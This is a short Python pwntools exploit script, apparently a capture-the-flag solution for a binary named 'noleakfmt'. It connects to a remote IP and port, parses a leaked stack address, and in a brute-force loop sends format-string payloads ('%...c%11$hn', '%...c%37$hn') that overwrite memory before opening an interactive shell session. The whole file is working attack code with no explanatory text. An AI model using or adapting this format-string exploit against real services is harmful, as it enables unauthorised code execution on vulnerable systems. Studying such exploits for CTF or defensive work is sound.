from pwn import *

#vprintf->printf_positional

#0x7fffffffb898
context.log_level="debug"
for i in range(100):
  try:
    #p=process("./noleakfmt")
    p=remote("183.129.189.61",51805)
    p.recvuntil("gift : ")
    stack=int(p.recvuntil("\n"),16)+0x7fffffffb898-0x7fffffffe604-0x7ffdbeb11758+0x7ffdbeb104a8
    print hex(stack)
    if stack&0xffff < 0x2000:
        #gdb.attach(p)
        p.sendline("%"+str(stack&0xffff)+"c%11$hn")
        p.sendline("%"+str(0x127a)+"c%37$hn")
        p.interactive()
  except:
    print "no"
